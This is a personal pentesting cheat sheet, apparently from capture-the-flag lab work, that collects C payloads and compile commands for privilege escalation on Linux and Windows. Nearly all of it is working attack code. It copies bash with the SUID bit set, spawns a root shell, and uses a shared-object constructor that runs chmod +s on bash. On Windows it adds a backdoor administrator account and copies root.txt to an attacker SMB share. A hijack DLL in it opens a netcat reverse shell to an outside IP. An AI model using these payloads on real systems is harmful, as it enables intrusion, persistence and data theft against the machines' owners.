---
publish: true
created: 2026-01-31T20:51:10.910+05:30
modified: 2026-06-22T09:00:55.852+05:30
---

# Compile for Linux

You could compile c program and use them with binaries which have SUID bit set. something to know before compiling.
the architecture - `uname -a`
ldd version - `ldd--version`

```
onuma@TartarSauce:/var/tmp$ uname -a
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux

onuma@TartarSauce:/var/tmp$ ldd --version
ldd (Ubuntu GLIBC 2.23-0ubuntu10) 2.23
```

to avoid **glibc** version mismatches use the arugment `-static`. this will include the libraries in the binary.

Sometimes, setting the file permissions and changing the ownership of the file to root helps.

```
sudo chown root:root shell
sudo chmod 6555 shell
```

## copy bash

Create `root.c` and put below code. This will create `/tmp/bash`.  You will need to run `/tmp/bash -p` to run bash as root.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

int main() {
    setuid(0);
    seteuid(0);
    setgid(0);
    setegid(0);
    system("cp /bin/bash /tmp/bash; chown root:root /tmp/bash; chmod 6777 /tmp/bash");
}
```

## execute bash

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main ( int argc, char *argv[] )
{
    setreuid(0,0);
    execve("/bin/sh", NULL, NULL);
}
```

## modify bash permissions and trigger on object load

The below code was mainly used for generating a `.so` file.

`inject() __attribute__((constructor));`  - Triggers without any calls to function.

```c
#include <stdio.h>  
#include <stdlib.h>  
  
static void inject() __attribute__((constructor));   
  
void inject() {  
        system("chmod +s /bin/bash");  
}
```

## Compilation

### executable linux file

```
 # 32bit
 gcc -m32 -static -o shell root.c
```

### so - Shared Object

Compile the C file.

```bash
gcc -fPIC -shared -o shell.so shell.c
```

# Compile for Windows

## exe

```c
#include<windows.h>
#include<stdlib.h>
int main(void) {
  system("net user dinesh dinesh /add");
  system("net localgroup Administrators dinesh /add");
  WinExec("C:\\bd\\bd.service.exe", 0);
  return 0;
}
```

```c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user dinesh password123 /add && net localgroup administrators dinesh /add");
  return 0;
}
```

Program to copy `root.txt`.

```c
#include <stdlib.h>

int main() {
    system("type C:\\users\\administrator\\desktop\\root.txt > \\\\10.10.16.94\\files\\root.txt");
}
```

After this make sure to turn on the SMB service to recieve the file.

```
$ impacket-smbserver -smb2support files $(pwd)
```

## DLL hijack

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c C:\\ProgramData\\nc.exe 192.168.45.205 4445 -e cmd.exe");
        ExitProcess(0);
    }
    return TRUE;
}
```

## Compilation

Compiling for exe.

```
# apt install mingw-w64

# 32bit - (-l) parameter for using windows.h library
i686-w64-mingw32-gcc addAdmin.c -o bd.exe -l ws2_32 

#64bit
x86_64-w64-mingw32-gcc adduser.c -o adduser-taskkill.exe
```

Compiling for DLL.

```
# 64bit
$ x86_64-w64-mingw32-gcc windows_dll.c -shared -o PrintConfig.dll
```
